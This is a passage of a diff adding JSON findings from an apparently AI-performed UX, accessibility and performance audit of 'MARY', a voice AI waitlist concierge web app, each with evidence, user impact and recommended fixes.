+        "evidence": "MARY asks for the email 'so I know where to send your early-access confirmation' (docs/mary-voice.md worked example; src/lib/mary-prompt.server.ts:125), and the end screen says 'Your position comes with the confirmation' (src/features/mary/ui/end-screen.tsx:100). Yet no email is sent anywhere: grep for MailApp/GmailApp/sendEmail finds nothing in src/ or docs/google-sheets/Code.gs. 'Details confirmed' is a static list (end-screen.tsx:156-173) with no edit option. The only action is 'Start another conversation', which calls newSession() and reloads, wiping everything (mary-app.tsx:591-595; end-buttons in log-convo-desktop.json). There is no share or referral link. The desktop layout also breaks the email mid-word ('sarah@brightpath.co / m', shots/convo-desktop-21-end-settled.png).",
+        "user_impact": "Emails captured by voice are prone to transcription errors, and the visitor sees a wrong address but cannot fix it. Nothing reaches their inbox to prove the signup, and the peak-intent moment has no share step. LaunchList (2026) notes that referral and share prompts work best right at signup.",
+        "recommendation": "Send a confirmation email when the sheet writes the row (Apps Script MailApp in Code.gs upsertLead, or a transactional email provider) containing the real position and a share link. Add an 'Edit' affordance on each confirmed field that re-syncs through /api/lead. Add 'Share OmniSuite' (Web Share API) on the end screen. Use break-all or anywhere wrapping for the email only.",
+        "effort": "M",
+        "retell": "independent"
+      },
+      {
+        "title": "The 'your turn' cue is an 11px grey line; the big button looks the same whether MARY is talking or waiting",
+        "severity": "P2",
+        "area": "turn-taking",
+        "evidence": "Hold button label is 'Hold to talk to MARY' both while she speaks and when she waits (composer.tsx:94-98; log-voice-desktop.json shows hold='Hold to talk to MARY' with status 'MARY is speaking · hold to cut in' and then 'Hold the button or the space bar…'). Only the status line changes, and it is text-[0.7rem], muted (composer.tsx:303). Compare shots/voice-desktop-08-mid-welcome.png with shots/voice-desktop-10-your-turn.png. During the 1.8 s gap between her two beats the status still says 'MARY is speaking' while she is silent (shots/voice-ios-09-between-beats.png).",
+        "user_impact": "First-time voice users don't know when to answer. Some talk over her and cut her off; others wait in silence.",
+        "recommendation": "Show distinct floor states on the primary control: 'MARY is talking…' (muted, subtle waveform), then 'Your turn: hold to answer' (full colour, one pulse, optional haptic via navigator.vibrate on Android). Raise the status text to at least 14px. With Retell, drive the same states from the SDK's agent start/stop-talking and transcript events. The hold button goes away, but the listening/your-turn state still has to be designed.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "The landing page doesn't prepare visitors for the mic prompt, what MARY will ask, or how long the call really takes",
+        "severity": "P2",
+        "area": "landing",
+        "evidence": "Landing text (log-landing-ios.json): 'Meet MARY. Your AI Revenue Concierge. Talk to her for two minutes…'. It has no mic pre-prompt, and start() goes straight to getUserMedia (mary-app.tsx:517). The preview bubble 'Hi, I'm MARY. Want first access…' (landing.tsx:9) is not what she says; the live opener was 'Hello. I'm MARY, Omnikom's AI Revenue Concierge. OmniSuite is the AI and human revenue engine…'. The 'two minutes' claim versus the docs/mary-voice.md §10 worked example (10 MARY turns, 19 beats, 243 words): at the measured 0.42 s/word, 2.98 s turn latency and 1.28 s TTS start, plus 1.8 s follow-up gaps, that is about 3.1 min even for a terse caller (worked-example.txt). What OmniSuite does appears only in the 0.7rem footer. web.dev permissions guidance: 'preface the permission prompt with why the prompt is needed' (web.dev/articles/permissions-best-practices, 2024).",
+        "user_impact": "The native mic sheet appears without warning, expectations (2 min, 'first access') don't match the call, and the headline sells the agent rather than the visitor's benefit, which lowers Start and allow rates.",
+        "recommendation": "Under the CTA add: 'Your browser will ask for the microphone. About 3 minutes. She'll ask your name, business and email.' Replace the preview bubble with her real opener. Add a one-line benefit ('Early access + launch pricing for teams that live on leads'). With Retell the mic stays open for the whole call, so the priming copy must say so, and lower latency shortens the call only slightly because about 100 s of it is her speech.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "'Type instead' opens a voice call: MARY speaks aloud, Hold is the primary control, the copy says hold",
+        "severity": "P2",
+        "area": "typing fallback",
+        "evidence": "typeinstead-ios run: MARY's greeting plays with sound (voiceOff stays false: start(false) only sets listening 'paused', mary-app.tsx:532). Hold button and 'Hold the button while you talk' status are still primary, 'Can't hear her? … Play sound' shows, and the text box is 'Or type your answer' (shots/typeinstead-ios-10-your-turn.png). On phones the input is not focused (focusComposer only when hasFinePointer, mary-app.tsx:488-492).",
+        "user_impact": "People who chose typing because they are in a quiet or public place get a talking bot and a voice UI. They have to find the voice toggle and tap the text box before they can answer.",
+        "recommendation": "Make 'Type instead' a real chat mode: start with voiceOff true (keep the toggle), hide the Hold button, show the running transcript as chat bubbles, and focus the input after her first line. With Retell this path stays on /api/turn (docs/architecture/retell-migration.md:29,83), so it must be kept and polished separately.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The iPhone call opens with a 'Can't hear her?' troubleshooting row before she has said anything",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "shots/voice-ios-06-after-tap-1250ms.png: while the screen still shows '…' (Thinking), the row 'Can't hear her? Turn the volume up and tap Play sound. [Play sound] I can hear her' is already visible. It stays for the first 3 answers (mary-app.tsx:354-370, 'answers < 3').",
+        "user_impact": "The first thing an iPhone visitor sees is a hint that the product might be broken, which primes doubt and adds 3 controls to an already dense bottom area.",
+        "recommendation": "Show the row only after her first line has been playing for about 2 s and the visitor hasn't interacted. Collapse it to a small speaker icon after the first answer. With Retell, keep a fallback that calls the SDK's startAudioPlayback() inside a tap (docs.retellai.com/deploy/web-call), but only when audio is actually blocked.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "There is no way to end the call; closing the tab silently saves the partial transcript",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "Call header controls are only the talk-mode toggle and the voice toggle (src/features/mary/ui/call-stage.tsx:142-176); the button list for the call stage in log-voice-desktop.json has no end or leave control. On tab close or background, lead-lifecycle.ts flush beacons outcome 'abandoned' with the transcript and any captured fields (mary-app.tsx:400-413).",
+        "user_impact": "A visitor who wants out has to close the tab, gets no closure, and has their partial answers stored without being told.",
+        "recommendation": "Add an 'End' button in the call header. On tap, finalize as 'abandoned' and show a short end screen: 'Want launch news anyway? [email]' plus 'Delete what I said'. With Retell, End must call the SDK's stop and the webhook must record the outcome.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "One 'not now' ends the funnel with no lighter option to capture",
+        "severity": "P2",
+        "area": "end screen",
+        "evidence": "Prompt: 'if they want off the call, let them go warmly and set declined true' (src/lib/mary-prompt.server.ts:156, and :119 EXIT). The declined screen offers only 'Keep talking to MARY' or 'Start over' (end-screen.tsx:107-131; shots/declined-ios-21-end-settled.png). The mocked decline posted a row with every field empty (log-declined-ios.json).",
+        "user_impact": "Visitors who are curious but short on time leave with nothing captured, even though an email-only signup is the cheapest conversion.",
+        "recommendation": "On the declined screen add one field: 'Just want launch news? Leave your email' -> /api/lead with outcome 'updates_only'. In the prompt (and the Retell port), offer this once before EXIT.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Share previews and the canonical URL point at a domain that does not resolve (omnikom.ai)",
+        "severity": "P2",
+        "area": "landing",
+        "evidence": "src/routes/index.tsx:8 SITE_URL = 'https://omnisuite.omnikom.ai'. The live HTML serves og:image, og:url, twitter:image and canonical on .ai (ux-audit/funnel/live.html). dns.google: omnisuite.omnikom.ai -> NXDOMAIN (Status 3), omnisuite.omnikom.io -> 185.158.133.1; https://omnisuite.omnikom.io/og-omnisuite.jpg returns 200.",
+        "user_impact": "Links shared on LinkedIn, WhatsApp or iMessage (the conference and referral channel) show no preview image, and search engines are told the page lives on a dead domain.",
+        "recommendation": "Set SITE_URL to https://omnisuite.omnikom.io (or read it from an env var) and re-check with a link-preview debugger.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "Call-screen polish: optional Phone shown as a required step, jargon pills, unlabeled mode toggle on phones",
+        "severity": "P3",
+        "area": "conversation",
+        "evidence": "Progress pills list all six WAITLIST_FIELDS including 'Phone' (optional per docs/mary-voice.md §4) and 'Operations' (src/features/mary/ui/progress-pills.tsx:17-45). On phones the 'Quiet room? Go hands-free' label is hidden and only a radio icon remains (call-stage.tsx:161, 'hidden sm:inline'). See shots/voice-ios-08-mid-welcome.png.",
+        "user_impact": "The pills make the call feel like a six-field form and suggest the phone number is mandatory. The unlabeled icon invites mis-taps that switch the talk mode.",
+        "recommendation": "Show phone as '(optional)' or hide it until asked. Rename 'Operations' to 'How you work'. Give the mode toggle a visible short label on phones ('Hands-free').",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "The CTA is held back about 1-2 s by a fixed boot screen and staggered entrance animations",
+        "severity": "P3",
+        "area": "landing",
+        "evidence": "MIN_BOOT_MS 900 + BOOT_FADE_MS 500 (mary-app.tsx:78-79) and CTA entrance delay 0.4 s + 0.7 s (landing.tsx:77-81,142-145). The page renders client-only, so the SSR HTML has no text (routes/index.tsx:37-42; live.html has no body copy). Measured: Start button in the DOM 2.6 s after navigation on a fast connection (log-landing-ios.json) and 3.0-3.2 s on throttled slow 4G with 348 KB transferred (slow-net.mjs).",
+        "user_impact": "On congested conference wifi the visitor stares at 'Preparing your conversation' before the value proposition appears.",
+        "recommendation": "Drop MIN_BOOT_MS to 0 once the app has hydrated, shorten the CTA delay, and server-render the static landing copy so the headline and CTA paint with the HTML.",
+        "effort": "S",
+        "retell": "independent"
+      }
+    ]
+  },
+  "visual": {
+    "summary": "Lens: visual design, motion, accessibility and performance. I drove the LIVE production build (https://omnisuite.omnikom.io) and, for comparison, the repo at HEAD (local dev at 390x844). Every /api route and server function was mocked, so I made 0 live AI calls and 0 lead POSTs. I captured landing, call and end screens at 375x667, 390x844, 768x1024 and 1440x900, each in light, dark and reduced motion, plus 375x548, 700x900, landscape 844x390/667x375 and emulated safe-area insets. I ran axe-core 4.13, a keyboard-only walk, layout-shift observers, a frame-by-frame caption probe, rAF/long-task/LoAF/CDP perf sampling, and computed contrast from the OKLCH tokens. All scripts, screenshots and JSON are in /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/visual/ (call it V/ below).\n\nVerdict: the base is sound. Text contrast is 7.7-18.8:1 on the main pairs, CLS stays under 0.1 everywhere, landing and end pass axe, and the orb's JavaScript costs only 6-12 ms/s. It is not flawless yet:\n- On phones the caption area overflows on most two-beat turns. The visitor's echoed words get squashed or clipped and \"Show conversation\" disappears.\n- The old caption ghosts over the new one for about 330 ms on every turn.\n- The iPhone \"Can't hear her?\" row makes the hold button jump 52 px.\n- Reduced motion is ignored by motion/react.\n- The conversation panel is not a real modal, and the end confirmation is never announced to screen readers.\n- Two trust problems: the live UI is built from code that is in no git ref (44 className differences), and the share-card/canonical URLs point to a domain that does not exist.\n\nRetell keeps this UI (\"the screen, orb, progress and end screen are ours\"), so most call-screen fixes have to carry over. Retell also changes the plumbing the orb, caption and pills rely on: agent-only audio level, and a separate optional transcript socket with no exact word timing.",
+    "findings": [
+      {
+        "title": "Caption area overflows on phones: the visitor's echoed words get sliced and 'Show conversation' is pushed out of view",
+        "severity": "P1",
+        "area": "transcript",
+        "evidence": "V/caption-seq-390.json (live, 390x844, final settled state): the caption box is scrollHeight 182 vs clientHeight 136, the 'You · …' echo <p> is squashed to 0 px high, and 'Show conversation' starts at top 142 in a 136-px box, so it is fully hidden. Screenshots: V/shots/390x844-light-7-call-long-caption.png and V/shots/375x667-light-7-call-long-caption.png (half-height echo line). Repo version: V/repo/repo-390x844-light-7-call-long-caption.png (echo clipped on both sides, starts mid-word 'Realty, we're…'). Code: src/features/mary/ui/call-stage.tsx:194 fixed h-[10.5rem] + overflow-hidden (live uses h-[8.5rem]); :214 'max-w-xl truncate' inside an items-center column.",
+        "user_impact": "Whenever MARY answers in two beats after a longer answer, the visitor can no longer read what they said, and the only way to open the transcript disappears. A voice UI that loses the user's own words looks broken.",
+        "recommendation": "In call-stage.tsx, give the echo `shrink-0 max-w-full line-clamp-1` (drop max-w-xl truncate) so it keeps its line height. Clamp the current line (`line-clamp-3`) and the previous line (`line-clamp-1`, hide it below sm). Move 'Show conversation' out of the clipped box, for example into the header next to the voice toggle or as a chip beside the composer. Alternatively, make the box `flex-1 min-h-0` with a top fade mask (styles.css already has an unused trail-fade utility, :174).",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The live UI is built from code that is in no git ref (44 className differences), with fixes and regressions in both directions",
+        "severity": "P1",
+        "area": "copy/trust",
+        "evidence": "V/drift.mjs compares the live bundle V/live/routes-DZfdjxLS.js (downloaded 2026-09-26) with src/features/mary/ui/*: 44 live-only classNames. `git log --all -S` finds none of them in any ref, including origin/main 44318ba. Examples: live textarea 'text-sm' vs repo composer.tsx:284 'text-base … sm:text-sm'; live 'Start another conversation' has 'min-h-11' vs repo end-screen.tsx:180 'text-xs' (measured 150x16 tap target in V/repo/run-repo-390x844-light.json); live caption box h-[8.5rem] vs repo 10.5rem; live status line text-[0.62rem] vs repo 0.7rem (composer.tsx:303). The live bundle has no wakeLock code, which is consistent with PR #1 plus unsynced Lovable-side UI edits.",
+        "user_impact": "Any UI fix made in GitHub, including PR #2 and the Retell UI work, starts from a baseline visitors do not see. The next Lovable publish from GitHub will silently revert the live mobile compaction (e.g. 44-px header targets), or Lovable's edits will overwrite repo fixes.",
+        "recommendation": "Before merging PR #2, pull Lovable's current project state into GitHub (Lovable's GitHub sync, or copy the live component code into a branch). Diff it, choose per class, and only then apply the findings below. Add a CI check or checklist step that compares the deployed bundle hash with the build of main.",
+        "effort": "M",
+        "retell": "independent"
+      },
+      {
+        "title": "Live typing box is 14 px on phones, so iPhone Safari zooms the whole call screen when it is tapped",
+        "severity": "P1",
+        "area": "typing fallback",
+        "evidence": "V/textarea.mjs on live, 390x844 iPhone UA: computed textarea font-size 14px, class 'max-h-24 … text-sm'. The viewport meta has no maximum-scale (src/routes/__root.tsx:84). The repo has the correct 16 px (composer.tsx:284 'text-base … sm:text-sm'), so this is a live-only regression. Sources: https://defensivecss.dev/tip/input-zoom-safari/ and https://css-tricks.com/16px-or-larger-text-prevents-ios-form-zoom/ (Safari zooms focused inputs rendered below 16 px and does not zoom back out).",
+        "user_impact": "People who choose 'Type instead' (loud rooms, mic denied) see the page zoom in on focus. The header, orb and hold button slide off-screen and the page stays zoomed after sending, which feels broken on the fallback path.",
+        "recommendation": "Restore text-base (16 px) on the textarea below sm, as in the repo, when the live code is reconciled. Check any other input the owner vault uses.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "Share card and canonical URL point to omnisuite.omnikom.ai, which does not exist (NXDOMAIN)",
+        "severity": "P1",
+        "area": "copy/trust",
+        "evidence": "Live HTML (V/live/index.html) has og:image https://omnisuite.omnikom.ai/og-omnisuite.jpg, og:url and rel=canonical on the same host. https://dns.google/resolve?name=omnisuite.omnikom.ai returns Status 3 (NXDOMAIN), and so does omnikom.ai. The image exists at https://omnisuite.omnikom.io/og-omnisuite.jpg (200, 58,131 bytes). Code: src/routes/index.tsx:8 SITE_URL.",
+        "user_impact": "Every link shared in iMessage, WhatsApp, LinkedIn or Slack shows no preview image. Search engines are told the canonical page lives on a dead domain. This is the first impression for most referred visitors.",
+        "recommendation": "Set SITE_URL in src/routes/index.tsx:8 to https://omnisuite.omnikom.io, or derive it from the request host. Re-check with a link-preview debugger after deploy.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "The previous caption ghosts over the new one for about 330 ms on every turn, even with reduced motion",
+        "severity": "P2",
+        "area": "orb/motion",
+        "evidence": "V/caption-seq-390.json rows t=725-1062 and t=3245-3562: the exiting line is position:absolute (AnimatePresence mode=\"popLayout\") at opacity 0.95→0 while the new line fades in at the same spot. Screenshots: V/shots/390x844-light-8-call-after3.png, V/shots/1440x900-light-8-call-after3.png, V/shots/390x844-light-reduced-8-call-after3.png, V/repo/repo-390x844-light-8-call-after3.png (both texts overlap). Code: call-stage.tsx:195 and :222 popLayout; exit {opacity:0, y:-10} is applied even when reduced.",
+        "user_impact": "Every reply starts with two sentences printed on top of each other, the most visible 'unpolished' moment on the main screen.",
+        "recommendation": "For the caption use mode=\"wait\" with a 120-150 ms opacity-only exit, or crossfade in a grid cell (both children in `grid-area:1/1`) so they never overlap spatially. Drop the y offset when reduced.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "iPhone 'Can't hear her?' row is on from the first second, and removing it makes the hold button jump 52 px",
+        "severity": "P2",
+        "area": "turn-taking",
+        "evidence": "The row is shown before MARY has said anything (V/shots/390x844-light-2-call-thinking.png) and stays for the first 3 answers (src/features/mary/mary-app.tsx:350-368). When it goes away, a layout-shift entry records: orb canvas 117→143, composer height 201→149, hold button top 454→506 (V/run-375x667-light.json, t=24024, value 0.051). The same happens at 390x844 (V/run-390x844-light.json, 631→683). This contradicts composer.tsx:205-206 ('the button never moves under a thumb'), because the hint renders below the textarea (composer.tsx:320).",
+        "user_impact": "On every iPhone call a warning sits under the controls while MARY is clearly audible (the operator confirmed audio works). Just after the third answer, the button a thumb is resting on moves 52 px down, which invites mis-taps and makes the screen feel jumpy.",
+        "recommendation": "Reserve a fixed-height slot for all notices: min-h on the notice container, or absolutely position the hint above the hold button with a fade. Show the row only after her first line has finished playing with no reaction, or collapse it to one 'Can't hear? Tap to play' chip.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Words MARY has not spoken yet sit at 1.57:1 contrast (axe: serious)",
+        "severity": "P2",
+        "area": "accessibility",
+        "evidence": "axe color-contrast violations on the call screen in V/run-390x844-light.json (call.axe): fg #cbcac7 on #fbfaf7 = 1.57:1 at 20 px (4.5:1 required) and at 26.4 px on desktop (3:1 required). V/contrast.mjs: ink over the page reaches 3.12:1 at alpha 0.45 and 5.13:1 at 0.6. Code: call-stage.tsx:22 'opacity-20'. The full line is painted ghosted from the moment it is added, before any audio (V/shots/390x844-light-3-call-speaking-start.png).",
+        "user_impact": "Low-vision readers, and anyone in sunlight, cannot read ahead or read along. During the speech start delay the whole sentence shows as a faint grey block.",
+        "recommendation": "Either raise unrevealed words to opacity ≥0.6 on phones (≥0.45 at ≥24 px) and keep the karaoke contrast step small, or do not paint unrevealed words and reserve their space with `invisible`, so words appear as she says them.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "prefers-reduced-motion is not honoured by motion/react: the orb still flies and scales between screens",
+        "severity": "P2",
+        "area": "accessibility",
+        "evidence": "V/motion-probe.mjs with reducedMotion=reduce: 58 distinct orb positions over about 650 ms after Start (216→203 px, y 253→184), the same spring as without reduce. There is no MotionConfig anywhere in src (grep). Motion's docs say the default reducedMotion is \"never\", and \"user\" disables transform and layout animations while keeping opacity (https://motion.dev/docs/react-motion-config). Only some components guard `initial` with useReducedMotion. layoutId sits at call-stage.tsx:188 and landing/end screens, and exit y offsets are not guarded.",
+        "user_impact": "Visitors who asked their OS for less motion still get the shared-element flight and sliding caption exits on every screen change and every turn.",
+        "recommendation": "Wrap <LayoutGroup> in mary-app.tsx with <MotionConfig reducedMotion=\"user\">. This removes the layout, transform and y animations globally, keeps the opacity fades, and makes most per-component `reduced ? … :` branches unnecessary.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The orb redraws at 60 fps in every state, forever, including the static end screen",
+        "severity": "P2",
+        "area": "performance",
+        "evidence": "V/perf-ios-x1-no-preference.json vs V/perf-ios-x1-reduce.json (same flow, orb static when reduced):\n- End screen idle: 482 vs 242 rAF callbacks in 4 s, so the orb adds 60 frames/s indefinitely.\n- Main-thread busy (CDP TaskDuration): landing 97% vs 1.3%, speaking 93.6% vs 3.2%, end 52.6% vs 2.7%.\n- With CPU throttled 4x (V/perf-ios-x4-no-preference.json): about 40 fps, p50 33 ms on the landing.\n- Orb JavaScript is small (5.9-11.6 ms/s), so the cost is GPU presentation.\n- The runner uses SwiftShader software GL, so absolute numbers apply to software-GL devices, not iPhone 13.\n- Also: a 1348-ms long task during load at 4x, 131-184 ms frames right after Start, while the orb flight animates.\nCode: mary-orb.tsx:134-157 (loop never idles); orb-renderer.ts:70 antialias:true although the shader already anti-aliases the edge with smoothstep; mary-orb.tsx:101 DPR cap 1.5 (324x324 canvas at 390 px).",
+        "user_impact": "Constant GPU work drains phone battery on a page people leave open after signing up. On software-GL or low-end devices it causes dropped frames exactly during transitions and speech.",
+        "recommendation": "In mary-orb.tsx:\n- Stop the loop in 'done' about 2 s after the bloom settles.\n- Drop to ~24-30 fps in idle/listening, and use full rate only while speaking or hearing.\n- Pause the landing orb after ~10 s without interaction.\nIn orb-renderer.ts:70, set antialias:false and powerPreference:'low-power'.\nFall back to the 2D or static frame when the renderer string contains 'SwiftShader' or when frame p95 exceeds 25 ms.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "'Conversation so far' panel is not a real modal, and focus is pulled into the composer behind it",
+        "severity": "P2",
+        "area": "accessibility",
+        "evidence": "V/keyboard.json (1440x900, keyboard only):\n- After Enter on 'Show conversation', focus sits on the textarea behind the dialog (dialogOpenFocus). onSettled calls focusComposer (mary-app.tsx:158-166).\n- aria-modal is null and nothing is inert.\n- Tab goes Close → body → header buttons behind the overlay.\n- Escape does not close it (dialogAfterEscape: true).\n- After Close, focus goes to <body>, not back to the trigger.\n- axe: scrollable-region-focusable on the <ol> transcript.\nCode: call-stage.tsx:34-83. W3C APG modal dialog requires focus inside on open, Tab trapped, Escape closes, focus returned to the invoker, and aria-modal=true (https://www.w3.org/WAI/ARIA/apg/patterns/dialog-modal/).",
+        "user_impact": "Keyboard and screen-reader users cannot use or leave the transcript panel predictably, and typing aimed at the panel lands in the answer box.",
+        "recommendation": "Use a real dialog: native <dialog> with showModal(), or Radix Dialog if it is already a dependency. Suppress focusComposer while the panel is open, make the <ol> focusable (tabIndex=0), and close on Escape and on backdrop click.",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Focus falls to <body> at every screen change, the call screen has no heading, and 'You're on the list' is never announced",
+        "severity": "P2",
+        "area": "accessibility",
+        "evidence": "V/keyboard.json: afterWelcome, focusAfterClose and endFocus are all '(body)'. Headings on the call screen: none; only the end screen has an H1. The only live region is inside CallStage (call-stage.tsx:182), so it unmounts when the end screen appears. The document title never changes (endTitle unchanged). The textarea has outline-none and no focus-within style (composer.tsx:284; V/shots/focus/call2-5.png shows no indicator). Other buttons fall back to the thin browser outline (V/shots/focus/call2-4.png), unlike the designed ring on Start (V/shots/focus/landing-0.png).",
+        "user_impact": "Screen-reader users get no confirmation that the lead was saved, the most important moment of the funnel. After Start they are thrown to the top of an unlabeled page. Keyboard users lose their place on every turn and cannot see where the typing focus is.",
+        "recommendation": "- Add an sr-only <h1> 'Talking with MARY' on the call screen.\n- On stage change, focus the new screen's H1 (tabIndex=-1).\n- Put a persistent polite live region in MaryApp (mary-app.tsx) that says 'You're on the list, position N'.\n- Set document.title per stage.\n- Add `focus-within:shadow-[0_0_0_2px_var(--color-ink)]` to the composer shell.\n- Reuse the Start button's focus-visible ring on every button.",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The screen reader reads MARY's whole line the instant her voice starts, so two voices talk over each other",
+        "severity": "P2",
+        "area": "accessibility",
+        "evidence": "call-stage.tsx:181-184 announces `MARY: ${current.text}` through aria-live=polite. voice-line.ts:96-97 adds the line to the store before speak() starts, so VoiceOver or NVDA speech overlaps MARY's TTS. The status line is aria-live=\"off\" (composer.tsx:312). Notices are role=status elements inserted already filled inside AnimatePresence (composer.tsx:136-146). MDN warns that live regions added with content may not be announced (https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Guides/Live_regions). The orb's role=img label says 'MARY is speaking' on the silent landing (landing.tsx:103).",
+        "user_impact": "Blind visitors hear MARY and their screen reader say the same sentence at once. The screen reader's own speech can also reach the mic as 'the visitor talking'.",
+        "recommendation": "When voice is on, announce only the visitor-relevant state ('MARY is speaking', 'Your turn') and not the text. Offer a 'Read captions aloud' option, or announce the text when voiceOff is true. Keep one always-mounted status region for notices instead of mounting role=status nodes. Label the landing orb as decorative (aria-hidden).",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Key call-screen guidance is 9.9 px on phones (live)",
+        "severity": "P2",
+        "area": "accessibility",
+        "evidence": "V/run-375x667-light.json text survey (live):\n- 'MARY is speaking · hold to cut in' / 'Hold the button while you talk…': 9.9 px.\n- 'Can't hear her?…' and 'Play sound': 9.9 px.\n- Progress pills: 10.4 px.\n- End-screen field labels: 9.9 px.\n- Landing footer and 'MARY ·' label: 9.9 px.\nRepo equivalents: composer.tsx:303 text-[0.7rem] (11.2 px), landing.tsx:34 and end-screen.tsx:163 text-[0.62rem]. Apple HIG lists 11 pt as the minimum iOS text size (https://developer.apple.com/design/human-interface-guidelines/typography).",
+        "user_impact": "The one sentence that explains how to talk to MARY is the smallest text on the screen, often read at arm's length. This hurts first-call success and makes the UI look cramped rather than premium.",
+        "recommendation": "Floor the scale at 12 px for meta text and 14 px for instructions. Make the hold-mode instruction a 14-15 px line directly above the hold button, and cut the stack of three small lines under the composer to one (see the 'thinking' finding).",
+        "effort": "S",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "Recovery and header controls are below comfortable tap size",
+        "severity": "P2",
+        "area": "accessibility",
+        "evidence": "V/run-390x844-light.json targets (live):\n- 'Play sound' 70x19 and 'I can hear her' 83x19.\n- Talk-mode and voice toggles 32x44.\n- Transcript 'Close' 36x36.\nRepo is worse (V/repo/run-repo-390x844-light.json): toggles 40x32, Play 76x21, 'Show conversation' 150x28, 'Start another conversation' 150x16.\nCode: composer.tsx:326/333 py-0.5; call-stage.tsx:158/169 px-3 py-2; call-stage.tsx:58 size-9. WCAG 2.2 SC 2.5.8 sets a 24x24 CSS px minimum (https://www.w3.org/WAI/WCAG22/Understanding/target-size-minimum.html). Apple HIG recommends 44x44 pt (https://developer.apple.com/design/human-interface-guidelines/accessibility).",
+        "user_impact": "The buttons for 'I can't hear her', the most stressful moment on an iPhone, are the hardest to hit. The voice and talk-mode toggles sit next to each other at 32 px wide.",
+        "recommendation": "Give Play sound and I can hear her min-h-11 px-4 (a chip row). Give the header toggles size-11 (44x44) with 8 px between them, and the dialog Close size-11.",
+        "effort": "S",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Progress pills overflow off-screen without any cue and give screen readers no done/next state",
+        "severity": "P2",
+        "area": "conversation",
+        "evidence": "Phones: the row is cut mid-word ('Real e', 'Bright') with the scrollbar hidden (V/shots/375x667-light-7-call-long-caption.png, V/shots/390x844-light-8-call-after3.png). At 768 the header pills slide under the 'Quiet room' button ('Busine', V/shots/768x1024-light-5-call-idle.png). Code: progress-pills.tsx:14 'no-scrollbar … overflow-x-auto'. State is shown only by a dot or a lime ring: the ring is 1.85:1 against the card (V/contrast.mjs), and each <li> has no text for done or next (progress-pills.tsx:17-45). axe: scrollable-region-focusable on the pill <ul>.",
+        "user_impact": "Visitors cannot see which detail comes next, or that there are six, so the 'two minutes' promise has no visible progress. Screen-reader users hear 'Sarah Okafor, Email, Phone…' with no sense of done or pending.",
+        "recommendation": "On phones, replace the scroller with a compact '3 of 6 · Email next' line plus a 6-dot meter, and keep full pills from md up. Add an edge fade, and scroll the next pill into view (scrollIntoView({inline:'nearest'})). Add sr-only 'saved' or 'next' text, and use a checkmark icon rather than a colour-only ring.",
+        "effort": "M",
+        "retell": "changes_with_retell"
+      },
+      {
+        "title": "Tablet landing: MARY's preview card is cut off at the right edge from 640 to about 830 px",
+        "severity": "P2",
+        "area": "landing",
+        "evidence": "V/tablet.mjs: at 768x1024 the card spans x 491→811 (43 px past the viewport); at 700x900, 441→761 (61 px past). Screenshots: V/shots/768x1024-light-1-landing.png, V/shots/700x900-light-1-landing.png. Code: landing.tsx:109 'absolute left-[calc(100%-1.5rem)] … w-80 sm:block'.",
+        "user_impact": "On iPad portrait, the hero's own sentence ('Want first access to…') is clipped, which looks broken on the first screen.",
+        "recommendation": "Switch to the side-card layout only from lg (≥1024), and keep the stacked phone layout (card above the orb) for sm and md. Or use `w-[min(20rem,calc(50vw-6rem))]`.",
+        "effort": "S",
+        "retell": "independent"
+      },
+      {
+        "title": "Phone landscape: MARY's words vanish from the call screen, and the notch overlaps controls",
+        "severity": "P2",
+        "area": "transcript",
+        "evidence": "V/landscape.mjs, call screen:\n- 844x390: the caption box is 0 px tall (box [195,195,0]) while her line should render below it, so nothing is visible (V/shots/safe/landscape-844x390-call.png).\n- 667x375: same.\nLanding at 844x390: scrollHeight 553 and the CTA sits at 431-487, below the fold (V/shots/safe/landscape-844x390-landing.png).\nWith emulated insets (V/safe.mjs, CDP Emulation.setSafeAreaInsetsOverride):\n- Landscape: env(left/right)=47 px, but the logo starts at x=32 and the voice toggle ends at x=812 (>797).\n- Home-screen portrait (the manifest declares display:standalone): top inset 47 px, but header buttons sit at y=2-46, under the status bar.\nCode: call-stage.tsx:186 and :194; site-frame.tsx:62 (no env() padding).",
+        "user_impact": "A visitor who turns the phone sideways hears MARY but sees no text. Controls sit under the notch or status bar in landscape and home-screen mode.",
+        "recommendation": "Below 480 px height, use a two-column call layout (orb and caption left, composer right), or hide the orb and keep the caption. Add `pt-[env(safe-area-inset-top)] px-[max(1.25rem,env(safe-area-inset-left))]` (and right) to SiteHeader and the section shells. Check the bottom composer on an iOS 26 device, where fixed content near the floating toolbar is reported as clipped (https://developer.apple.com/forums/thread/800798).",
+        "effort": "M",
+        "retell": "must_carry_into_retell"
+      },
+      {
+        "title": "The CTA becomes usable only about 1.74 s after first paint, on every visit",
+        "severity": "P2",
+        "area": "performance",
